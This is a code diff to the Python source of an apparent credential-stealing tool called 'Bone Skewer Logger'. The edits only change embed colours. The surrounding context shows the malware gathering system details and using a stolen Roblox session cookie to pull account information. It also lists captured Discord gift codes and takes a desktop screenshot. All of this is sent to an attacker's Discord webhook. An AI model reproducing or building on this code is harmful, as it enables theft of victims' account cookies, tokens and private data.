@@ -186,7 +186,7 @@ class PcInfo:
 
     def get_inf(self, webhook):
         webhook = SyncWebhook.from_url(webhook, session=requests.Session())
-        embed = Embed(title="Bone Skewer Logger", color=5639644)
+        embed = Embed(title="Bone Skewer Logger", color=2840158)
 
         computer_os = platform.platform()
         cpu = wmi.WMI().Win32_Processor()[0]
@@ -344,7 +344,7 @@ class Discord:
                 if robo_cookie == "No Roblox Cookies Found":
                     pass
                 else:
-                    embed = Embed(title="Roblox Info", color=5639644)
+                    embed = Embed(title="Roblox Info", color=2840158)
                     headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
                     info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
 
@@ -431,7 +431,7 @@ class Discord:
                 for c, t in val_codes:
                     val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
 
-            embed = Embed(title=username, color=5639644)
+            embed = Embed(title=username, color=2840158)
             embed.add_field(name="\u200b", value=val + "\u200b", inline=False)
             embed.set_thumbnail(url=avatar)
 
@@ -449,7 +449,7 @@ class Discord:
         )
         image.save(tempfolder + "\\image.png")
 
-        embed2 = Embed(title="Desktop Screenshot", color=5639644)
+        embed2 = Embed(title="Desktop Screenshot", color=2840158)
         file = File(tempfolder + "\\image.png", filename="image.png")
         embed2.set_image(url="attachment://image.png")
 
